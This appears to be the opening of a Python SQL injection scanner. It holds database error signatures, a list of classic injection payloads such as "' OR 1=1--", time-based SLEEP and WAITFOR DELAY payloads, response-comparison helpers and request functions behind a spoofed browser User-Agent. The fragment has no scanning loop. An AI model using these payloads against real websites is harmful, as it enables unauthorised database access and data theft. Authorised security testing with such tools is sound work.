import requests
from difflib import SequenceMatcher

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
})

DB_ERRORS = {
    'MySQL': ['you have an error in your sql syntax', 'warning: mysql'],
    'PostgreSQL': ['postgresql', 'pg_query'],
    'MSSQL': ['microsoft sql server', 'odbc sql server driver'],
    'Oracle': ['ora-', 'oracle error'],
    'SQLite': ['sqlite', 'sqlite3']
}

BASIC_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
]

SLEEP_PAYLOADS = [
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]


def detect_database(response_text):
    response_lower = response_text.lower()
    for db_name, patterns in DB_ERRORS.items():
        for pattern in patterns:
            if pattern in response_lower:
                return db_name
    return "Unknown"


def similarity_ratio(text1, text2):
    return SequenceMatcher(None, text1, text2).ratio()


def send_request(url, data, method):
    if method == "post":
        return session.post(url, data=data, timeout=10)
    return session.get(url, params=data, timeout=10)


def send_request_timed(url, data, method, timeout=15):
    if method == "post":
        return session.post(url, data=data, timeout=timeout)
    return session.get(url, params=data, timeout=timeout)